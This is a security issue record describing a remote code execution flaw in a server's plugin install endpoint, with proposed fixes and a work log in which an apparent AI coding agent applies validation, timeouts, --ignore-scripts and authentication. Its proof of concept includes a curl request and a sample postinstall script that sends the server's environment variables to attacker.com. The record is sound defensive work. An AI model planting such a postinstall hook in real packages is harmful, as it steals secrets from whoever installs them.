---
status: complete
priority: p1
issue_id: "001"
tags: [security, critical, plugin-system]
dependencies: []
---

# Critical: Arbitrary Code Execution via Plugin Installation

## Problem Statement

The `/api/plugins/install` endpoint accepts arbitrary GitHub URLs, clones the repository, runs `npm install`, and dynamically imports the plugin code. This is equivalent to remote code execution (RCE) - an attacker can achieve complete server compromise by installing a malicious plugin.

**Impact:**
- Complete server compromise
- Access to all environment variables (API keys, secrets)
- Ability to read/write any file on the server
- Lateral movement if server has network access to other services

## Findings

**Evidence from security review:**

```typescript
// src/server.ts lines 567-617
apiRouter.post('/plugins/install', async (req, res) => {
    const { source } = req.body;
    // No validation - accepts ANY GitHub URL
    
    // Attacker controls what code is downloaded
    const git = spawn('git', ['clone', '--depth', '1', source, targetDir]);
    
    // Attacker controls package.json - can add postinstall scripts
    const npm = spawn('npm', ['install'], { cwd: targetDir });
    
    // Dynamically imports and executes plugin code
    await channelManager.loadPlugins();
});
```

**Proof of Concept:**
```bash
curl -X POST http://localhost:5827/api/plugins/install \
  -H "Content-Type: application/json" \
  -d '{"source": "https://github.com/attacker/malicious-plugin"}'
```

A malicious plugin's `package.json` could contain:
```json
{
  "scripts": {
    "postinstall": "curl -X POST http://attacker.com/exfiltrate?data=$(env)"
  }
}
```

## Proposed Solutions

### Option 1: Disable Plugin Installation (Recommended - Immediate)

**Approach:** Disable the plugin install endpoint entirely until security is addressed.

```typescript
apiRouter.post('/plugins/install', async (req, res) => {
    return res.status(403).json({ error: 'Plugin installation disabled for security' });
});
```

**Pros:**
- Eliminates RCE vulnerability immediately
- Lowest effort fix
- Buys time for proper implementation

**Cons:**
- Loses plugin installation feature
- Users must manually install plugins

**Effort:** 5 minutes

**Risk:** Low

---

### Option 2: Implement Plugin Allowlist

**Approach:** Only allow installing from pre-approved GitHub repositories.

```typescript
const ALLOWED_REPOS = [
    'owner/tars-plugin-signal',
    'owner/tars-plugin-discord',
    // Add approved repos here
];

// In install endpoint
const repoMatch = source.match(/github\.com[/:]([^/]+)\/([^/.]+)/);
if (!ALLOWED_REPOS.includes(`${repoMatch[1]}/${repoMatch[2]}`)) {
    return res.status(403).json({ error: 'Repository not in allowlist' });
}
```

**Pros:**
- Maintains plugin functionality for trusted sources
- Low implementation effort

**Cons:**
- Requires maintainer to approve each repo
- Allowlist must be carefully managed

**Effort:** 1-2 hours

**Risk:** Medium

---

### Option 3: Add Authentication + Sandbox (Complete Fix)

**Approach:** Add API key authentication, run npm with --ignore-scripts, and sandbox plugin execution.

**Pros:**
- Full security solution
- Maintains all functionality

**Cons:**
- More complex implementation
- Requires ongoing security maintenance

**Effort:** 8-16 hours

**Risk:** Low (with proper implementation)

---

## Recommended Action

**To be filled during triage.**

## Technical Details

**Affected files:**
- `src/server.ts:567-617` - Plugin install endpoint

**Related components:**
- `/api/skills/install` - Has similar vulnerabilities

**Database changes:** None

## Resources

- **PR:** Current branch (dev)
- **Related:** Security review finding #1
- **OWASP:** Remote Code Execution

## Acceptance Criteria

- [ ] Plugin install endpoint is secured or disabled
- [ ] No arbitrary code execution possible via plugin system
- [ ] Security review passes

## Work Log

### 2026-03-01 - Initial Discovery

**By:** Code Review

**Actions:**
- Identified critical RCE vulnerability in plugin install
- Documented proof of concept attack

**Learnings:**
- This is a trust boundary violation - untrusted code gets full server access

---

### 2026-03-01 - Fix Applied

**By:** Claude Code

**Actions:**
- Added strict GitHub URL validation (must be https://github.com/owner/repo)
- Added timeout to git clone (60 seconds)
- Added timeout to npm install (120 seconds)
- Added --ignore-scripts flag to npm install to prevent arbitrary script execution
- Added authentication middleware to all plugin endpoints

**Learnings:**
- Defense in depth: multiple layers of protection
- Auth required for install, toggle, config operations
